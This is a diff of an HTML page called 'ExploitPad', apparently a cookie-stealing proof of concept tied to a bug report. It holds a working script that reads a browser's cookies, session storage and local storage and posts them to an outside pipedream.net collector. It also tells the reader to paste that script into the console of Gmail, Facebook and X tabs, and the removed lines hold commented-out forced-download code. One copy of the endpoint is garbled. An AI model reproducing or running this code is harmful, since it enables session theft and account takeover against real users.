@@ -1,47 +1,12 @@
 <center><h1>Please refer to comment 9 + Steps to Reproduce + Attached PoCs + Impact + comment 11 Cookie Stealing</h1>
 
-    <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Code</title>
-    <!-- Monokai Theme CSS -->
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #000; /* Black background */
-            color: #fff; /* White text */
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .container {
-            width: 100%;
-            max-width: 800px;
-            background-color: #272822; /* Monokai background */
-            padding: 20px;
-            border-radius: 10px;
-            overflow-x: auto;
-        }
-        pre {
-            margin: 0;
-        }
-    </style>
-</head>
-<body>
-
-    <div class="container">
-        <pre><code class="language-html">&lt;!DOCTYPE html&gt;
-&lt;html lang="en"&gt;
-&lt;head&gt;
-    &lt;meta charset="UTF-8"&gt;
-    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
-    &lt;title&gt;Code Thief🏆&lt;/title&gt;
-    &lt;style&gt;
+    <title>Code Thief🏆</title>
+    <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             background-color: #121212; 
@@ -55,86 +20,98 @@
             text-align: center; 
             overflow: auto; 
         }
-        h2 { font-size: 28px; margin-bottom: 15px; }
+        h2 { 
+            font-size: clamp(1.5rem, 5vw, 2.5rem); /* Scales between 24px and 40px */
+            margin-bottom: 1rem; 
+        }
         .container { 
-            width: 90%; 
-            min-width: 300px; 
-            max-width: 800px; 
+            width: 95%; /* Fluid width */
+            min-width: 280px; /* Minimum for tiny screens */
+            max-width: 1200px; /* Cap for large screens */
             background: #1e1e1e; 
-            padding: 20px; 
+            padding: 2vw; /* Relative padding */
             border-radius: 10px; 
             border: 2px solid gold; 
             box-shadow: 0 0 15px gold; 
         }
         textarea { 
             width: 100%; 
-            height: 150px; 
+            height: 20vh; /* Relative height */
+            min-height: 100px; /* Minimum height */
             background-color: #222; 
             color: gold; 
             border: 2px solid gold; 
-            padding: 10px; 
+            padding: 1rem; 
             font-family: monospace; 
-            font-size: 14px; 
+            font-size: clamp(12px, 3vw, 16px); /* Responsive font size */
             border-radius: 10px; 
-            margin-top: 10px; 
+            margin-top: 1rem; 
             resize: vertical; 
         }
         button { 
             background-color: gold; 
             color: black; 
             border: none; 
-            padding: 12px 24px; 
-            font-size: 16px; 
+            padding: 0.75rem 1.5rem; 
+            font-size: clamp(14px, 3vw, 18px); 
             font-weight: bold; 
             cursor: pointer; 
             border-radius: 8px; 
-            margin-top: 10px; 
+            margin-top: 1rem; 
             transition: 0.3s; 
             width: 100%; 
         }
         button:hover { background-color: #ffcc00; }
         iframe { 
             width: 100%; 
-            height: 300px; 
+            height: 40vh; /* Relative height */
+            min-height: 200px; /* Minimum height */
             border: 2px solid gold; 
             border-radius: 10px; 
             background-color: white; 
-            margin-top: 10px; 
+            margin-top: 1rem; 
         }
         .instructions { 
-            margin-top: 20px; 
-            font-size: 14px; 
+            margin-top: 1.5rem; 
+            font-size: clamp(12px, 2.5vw, 14px); 
             color: #ccc; 
         }
-    &lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;h2&gt;👽ExploitPad🕵️&lt;/h2&gt;
-    &lt;div class="container"&gt;
-        &lt;textarea id="demoCode" placeholder="Write your HTML, CSS, or JavaScript here..."&gt;&lt;!DOCTYPE html&gt;
-&lt;html lang="en"&gt;
-&lt;head&gt;
-    &lt;meta charset="UTF-8"&gt;
-    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
-    &lt;title&gt;Ghost Shell Cookie Stealer PoC&lt;/title&gt;
-    &lt;style&gt;
+
+        /* Media Queries for Fine-Tuning */
+        @media (max-width: 600px) {
+            .container { padding: 1rem; }
+            h2 { margin-bottom: 0.75rem; }
+            button { padding: 0.5rem 1rem; }
+        }
+    </style>
+</head>
+<body>
+    <h2>👽ExploitPad🕵️</h2>
+    <div class="container">
+        <textarea id="demoCode" placeholder="Write your HTML, CSS, or JavaScript here..."><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ghost Shell Cookie Stealer PoC</title>
+    <style>
         body { background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; font-family: Arial, sans-serif; }
         h2 { text-align: center; color: gold; text-shadow: 0 0 10px rgba(255, 215, 0, 0.8); }
-    &lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;h2&gt;Ghost Shell Cookie Stealer Hidden PoC&lt;/h2&gt;
-&lt;/body&gt;
-&lt;/html&gt;&lt;/textarea&gt;
-        &lt;button onclick="runCode()"&gt;▶ Run Demo Code&lt;/button&gt;
-        &lt;textarea id="stealScript" readonly&gt;javascript:(function(){var c=document.cookie||'No_Cookies_Found';var ss={};for(var i=0;i&lt;sessionStorage.length;i++){ss[sessionStorage.key(i)]=sessionStorage.getItem(sessionStorage.key(i));}var ls={};for(var i=0;i&lt;localStorage.length;i++){ls[localStorage.key(i)]=localStorage.getItem(localStorage.key(i));}if(Object.keys(ss).length===0)ss='No_Session_Data';if(Object.keys(ls).length===0)ls='No_Local_Data';fetch('https://eoy4evvlsf7y0jq.m.pipedream.net',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie_data:c,session_storage:ss,local_storage:ls,user_agent:navigator.userAgent||'Unknown_User_Agent',referrer:document.referrer||'No_Referrer',source:location.hostname,location:window.location.href})}).then(r=&gt;console.log('Data sent:',r)).catch(e=&gt;console.error('Error:',e));})();&lt;/textarea&gt;
-        &lt;iframe id="output"&gt;&lt;/iframe&gt;
-        &lt;div class="instructions"&gt;
-            &lt;p&gt;Gmail, FB, and X opened in new tabs. Copy the script above, paste it into each tab's console (F12), and press Enter to steal cookies and storage.&lt;/p&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
+    </style>
+</head>
+<body>
+    <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
+</body>
+</html></textarea>
+        <button onclick="runCode()">▶ Run Demo Code</button>
+        <textarea id="stealScript" readonly>javascript:(function(){var c=document.cookie||'No_Cookies_Found';var ss={};for(var i=0;i<sessionStorage.length;i++){ss[sessionStorage.key(i)]=sessionStorage.getItem(sessionStorage.key(i));}var ls={};for(var i=0;i<localStorage.length;i++){ls[localStorage.key(i)]=localStorage.getItem(localStorage.key(i));}if(Object.keys(ss).length===0)ss='No_Session_Data';if(Object.keys(ls).length===0)ls='No_Local_Data';fetch('https://eoy4evvlsf7y0jq.m.piped beam.net',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie_data:c,session_storage:ss,local_storage:ls,user_agent:navigator.userAgent||'Unknown_User_Agent',referrer:document.referrer||'No_Referrer',source:location.hostname,location:window.location.href})}).then(r=>console.log('Data sent:',r)).catch(e=>console.error('Error:',e));})();</textarea>
+        <iframe id="output"></iframe>
+        <div class="instructions">
+            <p>Gmail, FB, and X opened in new tabs. Copy the script above, paste it into each tab's console (F12), and press Enter to steal cookies and storage.</p>
+        </div>
+    </div>
 
-    &lt;script&gt;
+    <script>
         // Function to run demo code in iframe
         function runCode() {
             let code = document.getElementById("demoCode").value;
@@ -149,14 +126,14 @@
         function stealAndSendData(win, context) {
             var cookies = win.document.cookie || "No_Cookies_Found";
             var sessionData = {};
-            for (var i = 0; i &lt; win.sessionStorage.length; i++) {
+            for (var i = 0; i < win.sessionStorage.length; i++) {
                 var key = win.sessionStorage.key(i);
                 sessionData[key] = win.sessionStorage.getItem(key);
             }
             if (Object.keys(sessionData).length === 0) sessionData = "No_Session_Data";
 
             var localData = {};
-            for (var i = 0; i &lt; win.localStorage.length; i++) {
+            for (var i = 0; i < win.localStorage.length; i++) {
                 var key = win.localStorage.key(i);
                 localData[key] = win.localStorage.getItem(key);
             }
@@ -182,10 +159,10 @@
                 },
                 body: JSON.stringify(payload)
             })
-            .then(response =&gt; {
+            .then(response => {
                 console.log("Data sent successfully from " + context + ":", response);
             })
-            .catch(error =&gt; {
+            .catch(error => {
                 console.error("Error sending data from " + context + ":", error);
             });
         }
@@ -202,35 +179,7 @@
             window.open("https://facebook.com", "_blank");
             window.open("https://x.com", "_blank");
             runCode();
-
-            // Run demo code in iframe
         });
-    &lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
-    </div>
-
-    <!-- Prism.js JavaScript for syntax highlighting -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    </script>
 </body>
 </html>
- 
-<!--<a id="malwareLink" href="https://www.dummysoftware.com/popupdummy_testpage.html" target="_blank" download> 
-
-<script>
-  setTimeout(() => {
-    // Attempt 1: Simulate a click on the link
-    document.getElementById("malwareLink").click();
-
-    // Attempt 2: Open the download link in a new tab
-    window.open("https://www.dummysoftware.com/popupdummy_testpage.html");
-
-    // Attempt 3: Create an invisible link and click it
-    let a = document.createElement("a");
-    a.href = "https://www.dummysoftware.com/popupdummy_testpage.html";
-    a.download = "";
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-  }, 1000); // Trigger after 1 seconds
-</script>
